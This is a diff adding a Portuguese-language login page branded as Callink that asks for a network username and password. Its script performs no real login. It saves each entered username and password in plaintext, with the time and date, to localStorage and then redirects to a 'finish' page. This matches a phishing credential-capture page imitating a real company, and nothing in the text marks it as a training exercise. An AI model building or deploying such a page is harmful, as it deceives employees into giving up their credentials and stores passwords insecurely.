@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<link rel="shortcut icon" href="icone.png">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,300">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700,300">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="./style.css">
+
+<title>Login</title>
+</head>
+
+<body>
+
+<div class="signup__container">
+
+<div class="container__child signup__thumbnail">
+
+<div class="thumbnail__logo"><br><br><br>
+
+<!-- Logo grande apenas -->
+<img src="" style="width:55px;height:0px;">
+<img src="logo.png" style="width:260px;height:110px;">
+
+</div>
+
+<div class="thumbnail__links">
+<ul class="list-inline m-b-0 text-center">
+
+<li><a href="https://callink.com.br" target="_blank"><i class="fa fa-globe"></i></a></li>
+<li><a href="https://www.facebook.com/Callinkclk/" target="_blank"><i class="fa fa-facebook"></i></a></li>
+<li><a href="https://www.instagram.com/callinkclk/" target="_blank"><i class="fa fa-instagram"></i></a></li>
+<li><a href="https://twitter.com/Callinkclk" target="_blank"><i class="fa fa-twitter"></i></a></li>
+
+</ul>
+</div>
+
+<div class="signup__overlay"></div>
+
+</div>
+
+<div class="container__child signup__form">
+
+<form onsubmit="salvar(event)">
+
+<div class="form-group"><br><br><br><br>
+
+<label>Usuário</label>
+<input class="form-control" type="text" id="usuario" placeholder="Digite seu usuário de rede" required>
+
+</div>
+
+<div class="form-group">
+
+<label>Senha</label>
+<input class="form-control" type="password" id="password" placeholder="***************" required>
+
+</div>
+
+<div class="m-t-lg">
+<button style="width:240px;height:50px;" class="btn btn--form">Enviar</button>
+</div>
+
+</form>
+
+</div>
+
+</div>
+
+<script>
+function salvar(event){
+
+event.preventDefault();
+
+const usuario = document.getElementById("usuario").value;
+const senha = document.getElementById("password").value;
+
+const agora = new Date();
+
+const log = {
+usuario: usuario,
+senha: senha,
+hora: agora.toLocaleTimeString(),
+data: agora.toLocaleDateString()
+};
+
+let logs = JSON.parse(localStorage.getItem("logs")) || [];
+
+logs.push(log);
+
+localStorage.setItem("logs", JSON.stringify(logs));
+
+window.location.href = "finish.html";
+
+}
+</script>
+
+</body>
+</html>
